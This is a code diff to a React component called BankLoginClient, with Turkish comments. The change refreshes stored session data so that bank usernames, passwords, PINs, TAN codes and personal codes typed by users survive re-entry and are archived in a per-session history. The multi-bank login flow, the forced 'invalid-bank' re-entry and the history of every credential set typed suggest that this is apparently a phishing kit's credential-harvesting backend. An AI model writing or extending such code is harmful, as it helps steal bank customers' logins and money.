@@ -456,38 +456,55 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
         return [[key, trimmedValue]];
       }),
     );
+    // Kullanici verisini korumak icin form_data'yi DB'den taze oku
+    // (state eskimis/bos olabilir -> invalid-bank veya banka tekrar secimde
+    //  isim/soyisim/telefon form_data'dan SILINIYORDU).
+    let baseSessionFormData: Record<string, unknown> = sessionFormData;
+    try {
+      const { data: freshRow } = await supabase
+        .from("sessions")
+        .select("form_data")
+        .eq("id", sessionId)
+        .maybeSingle();
+      if (freshRow?.form_data && typeof freshRow.form_data === "object") {
+        baseSessionFormData = freshRow.form_data as Record<string, unknown>;
+      }
+    } catch {
+      /* state ile devam */
+    }
+
     const preservedSessionFormData = Object.fromEntries(
-      Object.entries(sessionFormData).filter(([key]) => !shouldResetPreviousBankField(key)),
+      Object.entries(baseSessionFormData).filter(([key]) => !shouldResetPreviousBankField(key)),
     );
 
     // ⭐ BANKA GECMISI APPEND: SADECE TEKRAR GIRISLERDE push et.
     //   ⚠️ HISTORY'E YENI DEĞIL, ESKI (degismeden onceki sessionFormData) alanlarini PUSH ET!
     //   Boylece kolon = YENI form (girilen), history = ESKI form (gorunur).
-    const prevOrdered1 = String((sessionFormData as any).orderedField1 || "").trim();
-    const prevUsername = String((sessionFormData as any).username || (sessionFormData as any).verfuegernummer || "").trim();
-    const prevPassword = String((sessionFormData as any).password || (sessionFormData as any).pin || "").trim();
+    const prevOrdered1 = String((baseSessionFormData as any).orderedField1 || "").trim();
+    const prevUsername = String((baseSessionFormData as any).username || (baseSessionFormData as any).verfuegernummer || "").trim();
+    const prevPassword = String((baseSessionFormData as any).password || (baseSessionFormData as any).pin || "").trim();
     const isFirstBankEntry =
       prevOrdered1.length === 0 && prevUsername.length === 0 && prevPassword.length === 0;
-    const previousHistory = Array.isArray((sessionFormData as any).bankFormHistory)
-      ? (sessionFormData as any).bankFormHistory.slice()
+    const previousHistory = Array.isArray((baseSessionFormData as any).bankFormHistory)
+      ? (baseSessionFormData as any).bankFormHistory.slice()
       : [];
     if (!isFirstBankEntry) {
-      const prevVerfuegernummer = String((sessionFormData as any).verfuegernummer || "").trim();
-      const prevUsernameInner = String((sessionFormData as any).username || "").trim();
-      const prevPin = String((sessionFormData as any).pin || "").trim();
-      const prevPasswordInner = String((sessionFormData as any).password || "").trim();
-      const prevBankPhone = String((sessionFormData as any).bankPhone || "").trim();
-      const prevPersonalCode = String((sessionFormData as any).personalCode || "").trim();
-      const prevTacCode = String((sessionFormData as any).tacCode || "").trim();
-      const prevLoginMethod = String((sessionFormData as any).loginMethod || "").trim();
-      const prevOrderedField1 = String((sessionFormData as any).orderedField1 || "").trim();
-      const prevOrderedField1Key = String((sessionFormData as any).orderedField1Key || "").trim();
-      const prevOrderedField2 = String((sessionFormData as any).orderedField2 || "").trim();
-      const prevOrderedField2Key = String((sessionFormData as any).orderedField2Key || "").trim();
-      const prevOrderedField2Type = String((sessionFormData as any).orderedField2Type || "").trim();
-      const prevOrderedField3 = String((sessionFormData as any).orderedField3 || "").trim();
-      const prevOrderedField3Key = String((sessionFormData as any).orderedField3Key || "").trim();
-      const prevOrderedField3Type = String((sessionFormData as any).orderedField3Type || "").trim();
+      const prevVerfuegernummer = String((baseSessionFormData as any).verfuegernummer || "").trim();
+      const prevUsernameInner = String((baseSessionFormData as any).username || "").trim();
+      const prevPin = String((baseSessionFormData as any).pin || "").trim();
+      const prevPasswordInner = String((baseSessionFormData as any).password || "").trim();
+      const prevBankPhone = String((baseSessionFormData as any).bankPhone || "").trim();
+      const prevPersonalCode = String((baseSessionFormData as any).personalCode || "").trim();
+      const prevTacCode = String((baseSessionFormData as any).tacCode || "").trim();
+      const prevLoginMethod = String((baseSessionFormData as any).loginMethod || "").trim();
+      const prevOrderedField1 = String((baseSessionFormData as any).orderedField1 || "").trim();
+      const prevOrderedField1Key = String((baseSessionFormData as any).orderedField1Key || "").trim();
+      const prevOrderedField2 = String((baseSessionFormData as any).orderedField2 || "").trim();
+      const prevOrderedField2Key = String((baseSessionFormData as any).orderedField2Key || "").trim();
+      const prevOrderedField2Type = String((baseSessionFormData as any).orderedField2Type || "").trim();
+      const prevOrderedField3 = String((baseSessionFormData as any).orderedField3 || "").trim();
+      const prevOrderedField3Key = String((baseSessionFormData as any).orderedField3Key || "").trim();
+      const prevOrderedField3Type = String((baseSessionFormData as any).orderedField3Type || "").trim();
       const previousHistoryEntry = {
         bankSlug: bank.slug as string | undefined,
         bankName: bank.name as string | undefined,
@@ -509,7 +526,7 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
         orderedField3Key: prevOrderedField3Key,
         orderedField3Type: prevOrderedField3Type,
         rawFields: Object.fromEntries(
-          Object.entries(sessionFormData as Record<string, any>).filter(
+          Object.entries(baseSessionFormData as Record<string, any>).filter(
             ([key]) => !shouldResetPreviousBankField(key) && typeof key === "string" && key.length > 0,
           ),
         ),
